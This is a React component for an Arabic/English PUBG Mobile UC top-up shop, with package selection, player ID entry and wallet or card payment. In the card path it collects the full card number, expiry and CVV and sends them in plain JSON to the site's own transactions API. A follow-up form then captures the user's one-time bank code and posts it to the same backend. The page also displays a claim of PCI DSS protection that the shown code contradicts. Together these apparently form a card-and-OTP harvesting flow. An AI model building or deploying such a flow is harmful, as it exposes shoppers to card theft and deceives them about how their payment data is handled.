import React, {useEffect, useMemo, useState} from 'react';
import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, ShieldAlert, Wallet, XCircle, CheckCircle2} from 'lucide-react';
import {CreditCardPaymentFields} from './CreditCardPaymentFields';
import {useLanguage} from '../context/LanguageContext';
import {apiUrl} from '../lib/apiBase';
import {formatLatinDigits} from '../lib/formatNumbers';
import {validateCard} from '../lib/cardValidation';
import type {CardValidationReason} from '../lib/cardValidation';
import {pubgUcIconSrc, PUBG_UC_PACKAGES, PUBG_UC_TIER_ICONS, type PubgUcPackage} from '../lib/pubgUcPackages';

type Step = 'package' | 'player' | 'payment';
type OtpState = 'idle' | 'checking' | 'failed';
type PaymentType = 'card' | 'wallet' | null;

type PubgUcOrderProps = {
  clientId: string | null;
  userId: string | null;
  walletBalance?: number;
  onBack: () => void;
  onComplete?: () => void;
  titleAr?: string;
  titleEn?: string;
  subtitleAr?: string;
  subtitleEn?: string;
  packages?: PubgUcPackage[];
  discountPercent?: number;
};

function applyDiscount(price: number, percent: number): number {
  if (!price || !percent || percent <= 0) return price;
  const p = Math.min(100, Math.max(0, percent));
  return Math.round(price * (100 - p) / 100);
}

function UcIcon({tier}: {tier: PubgUcPackage['iconTier']}) {
  return (
    <img
      src={pubgUcIconSrc(tier)}
      alt=""
      width={88}
      height={80}
      className="h-9 w-auto max-w-[3.25rem] object-contain sm:h-10"
      loading="lazy"
      decoding="async"
      onError={(e) => {
        const img = e.currentTarget;
        if (!img.src.includes('level1.cb11b2cd')) img.src = PUBG_UC_TIER_ICONS[1];
      }}
    />
  );
}

export function PubgUcOrder({
  clientId,
  userId,
  walletBalance = 0,
  onBack,
  onComplete,
  titleAr,
  titleEn,
  packages,
  discountPercent = 0,
}: PubgUcOrderProps) {
  const {lang, t, dir} = useLanguage();
  const BackIcon = dir === 'rtl' ? ArrowRight : ArrowLeft;
  const rawPackageList = useMemo(() => (packages && packages.length > 0 ? packages : PUBG_UC_PACKAGES), [packages]);
  const packageList = useMemo(
    () => rawPackageList.map((p) => ({
      ...p,
      originalPriceIqd: p.priceIqd,
      priceIqd: applyDiscount(p.priceIqd, discountPercent),
    })),
    [rawPackageList, discountPercent],
  );
  const hasDiscount = discountPercent > 0;

  const [step, setStep] = useState<Step>('package');
  const [selectedId, setSelectedId] = useState(packageList[0]?.id ?? '');
  const [playerId, setPlayerId] = useState('');
  const [topupCode, setTopupCode] = useState('');
  const [inputMode, setInputMode] = useState<'player' | 'code'>('player');
  const [paymentType, setPaymentType] = useState<PaymentType>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [cardValidationError, setCardValidationError] = useState<CardValidationReason | null>(null);
  const [showOtpStep, setShowOtpStep] = useState(false);
  const [otpCode, setOtpCode] = useState('');
  const [otpState, setOtpState] = useState<OtpState>('idle');
  const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
  const [done, setDone] = useState(false);

  const selected = useMemo(() => packageList.find((p) => p.id === selectedId) ?? packageList[0], [packageList, selectedId]);

  useEffect(() => {
    if (!packageList.find((p) => p.id === selectedId)) setSelectedId(packageList[0]?.id ?? '');
  }, [packageList, selectedId]);

  const resetFlow = () => {
    setShowOtpStep(false);
    setOtpCode('');
    setOtpState('idle');
    setCurrentOrderId(null);
    setIsSubmitting(false);
    setStep('package');
    setPaymentType(null);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!clientId || !selected) return;
    setIsSubmitting(true);
    try {
      const form = e.target as HTMLFormElement;
      const cardHolder = (form.elements.namedItem('cc-name') as HTMLInputElement).value;
      const cardNumber = (form.elements.namedItem('cc-number') as HTMLInputElement).value;
      const expMonth = (form.elements.namedItem('cc-exp-month') as HTMLSelectElement).value;
      const expYear = (form.elements.namedItem('cc-exp-year') as HTMLSelectElement).value;
      const expiry = expMonth && expYear ? `${expMonth}/${String(expYear).slice(-2)}` : '';
      const cvv = (form.elements.namedItem('cc-csc') as HTMLInputElement).value;
      const cardError = validateCard({number: cardNumber, expMonth, expYear, cvv});
      if (cardError) {
        setCardValidationError(cardError);
        setIsSubmitting(false);
        return;
      }
      setCardValidationError(null);

      const playerInfo = inputMode === 'player' ? `🆔 Player ID: ${playerId.trim()}` : `📦 طلب كود تعبئة (سيتم الإرسال بعد الدفع)`;
      const details =
        `🎮 شحن PUBG Mobile UC\n${playerInfo}\n` +
        `📦 الباقة: ${selected.label} UC\n💰 السعر: ${formatLatinDigits(selected.priceIqd)} دينار`;

      const res = await fetch(apiUrl('/api/transactions'), {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          client_id: clientId,
          user_id: userId,
          type: 'buy',
          amount: selected.priceIqd,
          method: t('creditCard'),
          details,
          card_fields: {holder: cardHolder, number: cardNumber.replace(/\s/g, ''), expiry, cvv},
        }),
      });
      if (!res.ok) { setIsSubmitting(false); return; }
      const data = await res.json();
      setCurrentOrderId(data.order_ref || data.id);
      setShowOtpStep(true);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentOrderId) return;
    setOtpState('checking');
    try {
      const res = await fetch(apiUrl('/api/transactions/otp'), {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({order_id: currentOrderId, otpDigit: otpCode.trim()}),
      });
      if (!res.ok) { setOtpState('failed'); return; }
      setOtpState('idle');
      setDone(true);
      onComplete?.();
    } catch {
      setOtpState('failed');
    }
  };

  const backBtn = (onClick: () => void, label?: string) => (
    <button type="button" onClick={onClick} className="flex items-center gap-2 mb-5">
      <div className="p-2 rounded-xl hover:bg-gray-100 transition-colors">
        <BackIcon className="h-5 w-5 text-gray-600" />
      </div>
      {label && <span className="text-sm font-bold text-gray-600">{label}</span>}
    </button>
  );

  // نجاح
  if (done) {
    return (
      <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
        <div className="w-24 h-24 bg-green-50 text-green-500 rounded-full flex items-center justify-center mb-6 border-8 border-green-50/50">
          <CheckCircle2 className="w-12 h-12" />
        </div>
        <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'تم الشحن بنجاح!' : 'Charged Successfully!'}</h2>
        <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'سيظهر الـ UC في حسابك خلال دقائق' : 'UC will appear in your account shortly'}</p>
        <button onClick={() => { setDone(false); resetFlow(); onBack(); }}
          className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95">
          {lang === 'ar' ? 'العودة للخدمات' : 'Back to Services'}
        </button>
      </div>
    );
  }

  // OTP
  if (showOtpStep) {
    return (
      <div className="max-w-md mx-auto pb-6">
        {backBtn(() => { setShowOtpStep(false); setOtpState('idle'); })}
        <div className="bg-white rounded-2xl border border-gray-100 p-6 text-center space-y-5">
          {otpState === 'failed' ? (
            <>
              <XCircle className="w-12 h-12 text-red-600 mx-auto" />
              <h3 className="font-black text-xl text-gray-900">{t('pubgPaymentRejected')}</h3>
              <button onClick={resetFlow} className="w-full rounded-2xl bg-gray-900 py-4 font-bold text-white">{t('pubgTryAgain')}</button>
            </>
          ) : otpState === 'checking' ? (
            <>
              <Activity className="w-10 h-10 animate-pulse text-red-600 mx-auto" />
              <p className="font-bold text-gray-700">{t('pubgProcessing')}</p>
            </>
          ) : (
            <>
              <div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto">
                <ShieldAlert className="w-8 h-8 text-red-600" />
              </div>
              <h3 className="font-black text-lg text-gray-900">{t('otpVerification')}</h3>
              <p className="text-sm text-gray-400">{t('otpSent')}</p>
              <form onSubmit={handleOtpSubmit} className="space-y-4">
                <input type="text" value={otpCode} onChange={(e) => setOtpCode(e.target.value)} required maxLength={6} dir="ltr"
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 py-4 text-center text-2xl font-black tracking-[0.4em] outline-none focus:border-red-400"
                  placeholder="------" />
                <button type="submit" disabled={otpCode.length < 4}
                  className="w-full rounded-2xl bg-red-600 py-4 font-black text-white disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
                  {t('verifyCode')}
                </button>
              </form>
            </>
          )}
        </div>
      </div>
    );
  }

  // خطوة 1: اختيار الباقة
  if (step === 'package') {
    return (
      <div className="max-w-2xl mx-auto pb-6">
        {backBtn(onBack, lang === 'ar' ? 'الخدمات' : 'Services')}
        <div className="mb-5">
          <h1 className="text-xl font-black text-gray-900">{lang === 'ar' ? (titleAr || 'شحن UC — ببجي موبايل') : (titleEn || 'PUBG Mobile UC')}</h1>
          <p className="text-sm text-gray-400 mt-1">{lang === 'ar' ? 'اختر الباقة المناسبة' : 'Select a UC package'}</p>
        </div>

        {hasDiscount && (
          <div className="mb-3 flex items-center gap-2 rounded-xl bg-red-50 border border-red-100 px-3 py-2">
            <span className="rounded-full bg-red-600 px-2 py-0.5 text-xs font-black text-white">-{discountPercent}%</span>
            <span className="text-xs font-bold text-red-700">{lang === 'ar' ? 'تخفيض عام على كل الباقات' : 'Discount on all packages'}</span>
          </div>
        )}

        <div className="grid grid-cols-2 gap-3 sm:grid-cols-2 mb-5">
          {packageList.map((pkg) => {
            const sel = selectedId === pkg.id;
            return (
              <button key={pkg.id} type="button" onClick={() => setSelectedId(pkg.id)} dir={dir}
                className={`flex items-center gap-3 rounded-2xl border-2 bg-white p-3 transition-all active:scale-[0.98] ${sel ? 'border-red-500 shadow-md shadow-red-100' : 'border-gray-100 hover:border-gray-200'}`}>
                <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-xl bg-gradient-to-b from-slate-50 to-slate-100">
                  <UcIcon tier={pkg.iconTier} />
                </div>
                <div className="min-w-0 flex-1" dir="ltr">
                  <p className="font-black text-sm text-gray-900 truncate">{pkg.label} <span className="text-gray-400 font-bold">UC</span></p>
                  <div className="flex items-baseline gap-2">
                    <p className="font-black text-sm text-gray-900">{formatLatinDigits(pkg.priceIqd)} <span className="text-[10px] font-bold text-gray-500">{t('iqd')}</span></p>
                    {hasDiscount && pkg.originalPriceIqd && pkg.originalPriceIqd > pkg.priceIqd && (
                      <p className="text-[10px] font-bold text-gray-400 line-through">{formatLatinDigits(pkg.originalPriceIqd)}</p>
                    )}
                  </div>
                </div>
                <span className={`flex h-5 w-5 shrink-0 items-center justify-center rounded-full border-2 transition-colors ${sel ? 'border-red-500 bg-red-500 text-white' : 'border-gray-200'}`}>
                  {sel && <Check className="h-3 w-3 stroke-[3]" />}
                </span>
              </button>
            );
          })}
        </div>

        {/* ملخص المختار */}
        {selected && (
          <div className="bg-gray-50 rounded-2xl border border-gray-100 px-4 py-3 flex justify-between items-center mb-4">
            <span className="text-sm text-gray-500">{lang === 'ar' ? 'الإجمالي' : 'Total'}</span>
            <span className="font-black text-gray-900" dir="ltr">{formatLatinDigits(selected.priceIqd)} {t('iqd')}</span>
          </div>
        )}

        <button onClick={() => setStep('player')}
          className="w-full bg-red-600 text-white font-black py-4 rounded-2xl text-base active:scale-[0.99] shadow-lg shadow-red-600/20">
          {lang === 'ar' ? 'متابعة' : 'Continue'}
        </button>
      </div>
    );
  }

  // خطوة 2: معرف اللاعب أو كود التعبئة
  if (step === 'player') {
    // كود التعبئة: متابعة فوراً | معرف اللاعب: يجب إدخاله
    const canContinue = inputMode === 'code' || playerId.trim().length > 3;
    return (
      <div className="max-w-md mx-auto pb-6">
        {backBtn(() => setStep('package'))}

        {/* ملخص الباقة */}
        <div className="bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-4 mb-4 flex items-center gap-4">
          <div className="w-14 h-14 rounded-2xl bg-white/10 flex items-center justify-center shrink-0">
            {selected && <UcIcon tier={selected.iconTier} />}
          </div>
          <div className="flex-1 min-w-0" dir="ltr">
            <p className="font-black text-white text-base">{selected?.label} <span className="text-white/70 font-bold">UC</span></p>
            <p className="text-sm font-black text-yellow-300 mt-1">{selected && formatLatinDigits(selected.priceIqd)} <span className="text-xs font-bold text-white/60">{t('iqd')}</span></p>
          </div>
          <button onClick={() => setStep('package')} className="text-xs font-bold text-white/60 hover:text-white bg-white/10 rounded-xl px-3 py-1.5 shrink-0 transition-colors">{lang === 'ar' ? 'تغيير' : 'Change'}</button>
        </div>

        {/* toggle: معرف / كود */}
        <div className="flex bg-gray-100 rounded-2xl p-1 mb-4">
          {(['player', 'code'] as const).map((mode) => (
            <button key={mode} onClick={() => setInputMode(mode)}
              className={`flex-1 py-2.5 text-sm font-bold rounded-xl transition-all ${inputMode === mode ? 'bg-white shadow text-gray-900' : 'text-gray-500'}`}>
              {mode === 'player' ? (lang === 'ar' ? 'معرف اللاعب' : 'Player ID') : (lang === 'ar' ? 'كود التعبئة' : 'Top-up Code')}
            </button>
          ))}
        </div>

        {inputMode === 'player' ? (
          <div className="bg-white rounded-2xl border border-gray-100 p-4 mb-4">
            <label className="text-xs font-bold text-gray-400 uppercase tracking-wide block mb-2">{lang === 'ar' ? 'معرف اللاعب' : 'Player ID'}</label>
            <input type="text" value={playerId} onChange={(e) => setPlayerId(e.target.value)} dir="ltr"
              placeholder="5123456789"
              className="w-full text-lg font-black text-gray-900 bg-transparent outline-none placeholder-gray-200" />
          </div>
        ) : null}

        <button onClick={() => { if (canContinue) setStep('payment'); }} disabled={!canContinue}
          className="w-full bg-red-600 text-white font-black py-4 rounded-2xl text-base disabled:opacity-40 active:scale-[0.99] shadow-lg shadow-red-600/20">
          {lang === 'ar' ? 'متابعة للدفع' : 'Continue to Payment'}
        </button>
      </div>
    );
  }

  // خطوة 3: طريقة الدفع + الدفع
  return (
    <div className="max-w-md mx-auto pb-6">
      {backBtn(() => { setPaymentType(null); setStep('player'); })}

      {/* ملخص الطلب */}
      <div className="bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-4 mb-4 flex items-center gap-4">
        <div className="w-14 h-14 rounded-2xl bg-white/10 flex items-center justify-center shrink-0">
          {selected && <UcIcon tier={selected.iconTier} />}
        </div>
        <div className="flex-1 min-w-0">
          <p className="font-black text-white text-base" dir="ltr">{selected?.label} <span className="text-white/70 font-bold">UC</span></p>
          {inputMode === 'player' && (
            <p className="text-xs text-white/50 mt-0.5 font-medium" dir="ltr">ID: {playerId}</p>
          )}
          <p className="text-sm font-black text-yellow-300 mt-1" dir="ltr">{selected && formatLatinDigits(selected.priceIqd)} <span className="text-xs font-bold text-white/60">{t('iqd')}</span></p>
        </div>
        <button onClick={() => setStep('package')} className="text-xs font-bold text-white/60 hover:text-white bg-white/10 rounded-xl px-3 py-1.5 shrink-0 transition-colors">
          {lang === 'ar' ? 'تغيير' : 'Change'}
        </button>
      </div>

      {/* اختيار طريقة الدفع */}
      {!paymentType ? (
        <div className="space-y-3">
          <h3 className="font-black text-gray-900">{lang === 'ar' ? 'طريقة الدفع' : 'Payment Method'}</h3>

          {/* بطاقة بنكية */}
          <button onClick={() => setPaymentType('card')}
            className="w-full flex items-center gap-4 bg-white rounded-2xl px-4 py-4 border-2 border-gray-100 hover:border-blue-300 active:scale-[0.99] transition-all shadow-sm">
            <div className="w-12 h-12 rounded-xl bg-blue-50 flex items-center justify-center shrink-0">
              <CreditCard className="w-6 h-6 text-blue-600" />
            </div>
            <div className="flex-1 text-start">
              <p className="font-black text-gray-900 text-sm">{lang === 'ar' ? 'بطاقة بنكية' : 'Bank Card'}</p>
              <p className="text-xs text-gray-400 mt-0.5">{lang === 'ar' ? 'فيزا / ماستركارد' : 'Visa / Mastercard'}</p>
            </div>
            <div className="flex items-center gap-1.5">
              <span className="inline-flex items-center justify-center rounded px-1.5 py-0.5 bg-blue-700 text-white text-[10px] font-black italic" style={{fontFamily:'Arial,sans-serif'}}>VISA</span>
              <span className="inline-flex items-center gap-0.5">
                <span className="w-5 h-5 rounded-full bg-red-500 -me-2 block" />
                <span className="w-5 h-5 rounded-full bg-yellow-400 block" />
              </span>
            </div>
          </button>

          {/* رصيد المحفظة */}
          <button
            onClick={() => { if (walletBalance >= (selected?.priceIqd ?? 0)) setPaymentType('wallet'); }}
            disabled={walletBalance < (selected?.priceIqd ?? 0)}
            className={`w-full flex items-center gap-4 rounded-2xl px-4 py-4 border-2 active:scale-[0.99] transition-all shadow-sm
              ${walletBalance >= (selected?.priceIqd ?? 0) ? 'bg-white border-gray-100 hover:border-green-300' : 'bg-gray-50 border-gray-100 opacity-60 cursor-not-allowed'}`}
          >
            <div className="w-12 h-12 rounded-xl bg-green-50 flex items-center justify-center shrink-0">
              <Wallet className="w-6 h-6 text-green-600" />
            </div>
            <div className="flex-1 text-start">
              <p className="font-black text-gray-900 text-sm">{lang === 'ar' ? 'رصيد المحفظة' : 'Wallet Balance'}</p>
              <p className="text-xs mt-0.5" dir="ltr">
                <span className={walletBalance >= (selected?.priceIqd ?? 0) ? 'text-green-600 font-bold' : 'text-red-400'}>
                  {formatLatinDigits(walletBalance)} {lang === 'ar' ? 'دينار' : 'IQD'}
                </span>
                {walletBalance < (selected?.priceIqd ?? 0) && (
                  <span className="text-red-400 ms-2">{lang === 'ar' ? '(غير كافٍ)' : '(Insufficient)'}</span>
                )}
              </p>
            </div>
            {walletBalance >= (selected?.priceIqd ?? 0) && (
              <span className="text-xs font-bold text-green-600 bg-green-50 px-2 py-1 rounded-full shrink-0">{lang === 'ar' ? 'متاح' : 'Available'}</span>
            )}
          </button>

          <div className="flex items-center gap-2 pt-1">
            <ShieldAlert className="w-4 h-4 text-gray-400 shrink-0" />
            <p className="text-xs text-gray-400">{lang === 'ar' ? 'عملية الدفع محمية بمعايير PCI DSS' : 'Payment secured with PCI DSS'}</p>
          </div>
        </div>
      ) : (
        <>
          <button onClick={() => setPaymentType(null)} className="flex items-center gap-1.5 text-xs font-bold text-gray-500 mb-4 hover:text-gray-800">
            <BackIcon className="w-3.5 h-3.5" />
            {lang === 'ar' ? 'تغيير طريقة الدفع' : 'Change payment method'}
          </button>

          {paymentType === 'wallet' ? (
            <div className="space-y-4">
              <div className="bg-green-50 rounded-2xl border border-green-100 p-4 flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-green-100 flex items-center justify-center">
                  <Wallet className="w-5 h-5 text-green-600" />
                </div>
                <div>
                  <p className="font-black text-gray-900 text-sm">{lang === 'ar' ? 'خصم من المحفظة' : 'Wallet Deduction'}</p>
                  <p className="text-xs text-gray-500" dir="ltr">{selected && formatLatinDigits(selected.priceIqd)} {lang === 'ar' ? 'دينار' : 'IQD'}</p>
                </div>
              </div>
              <button
                onClick={async () => {
                  if (!clientId || !selected) return;
                  setIsSubmitting(true);
                  try {
                    const playerInfo = inputMode === 'player' ? `🆔 Player ID: ${playerId.trim()}` : `📦 طلب كود تعبئة`;
                    const details = `🎮 شحن PUBG Mobile UC\n${playerInfo}\n📦 الباقة: ${selected.label} UC\n💰 السعر: ${formatLatinDigits(selected.priceIqd)} دينار\n💳 الدفع: رصيد المحفظة`;
                    const res = await fetch(apiUrl('/api/transactions'), {
                      method: 'POST',
                      headers: {'Content-Type': 'application/json'},
                      body: JSON.stringify({ client_id: clientId, user_id: userId, type: 'buy', amount: selected.priceIqd, method: lang === 'ar' ? 'رصيد المحفظة' : 'Wallet Balance', details }),
                    });
                    if (res.ok) { setDone(true); onComplete?.(); }
                  } catch (err) { console.error(err); }
                  finally { setIsSubmitting(false); }
                }}
                disabled={isSubmitting}
                className="w-full bg-red-600 text-white font-black py-4 rounded-2xl text-base disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20"
              >
                {isSubmitting ? <Activity className="w-5 h-5 animate-pulse mx-auto" /> : (lang === 'ar' ? 'تأكيد الدفع' : 'Confirm Payment')}
              </button>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="bg-white rounded-2xl border border-gray-100 p-4">
                <CreditCardPaymentFields idPrefix="pubg-cc" error={cardValidationError} onChange={() => setCardValidationError(null)} />
              </div>
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-gray-400 shrink-0" />
                <p className="text-xs text-gray-400">{lang === 'ar' ? 'عملية الدفع محمية بمعايير PCI DSS' : 'Payment secured with PCI DSS'}</p>
              </div>
              <button type="submit" disabled={isSubmitting}
                className="w-full bg-red-600 text-white font-black py-4 rounded-2xl text-base disabled:opacity-60 active:scale-[0.99] shadow-lg shadow-red-600/20">
                {isSubmitting ? <Activity className="w-5 h-5 animate-pulse mx-auto" /> : (lang === 'ar' ? 'تأكيد الدفع' : 'Confirm Payment')}
              </button>
            </form>
          )}
        </>
      )}
    </div>
  );
}
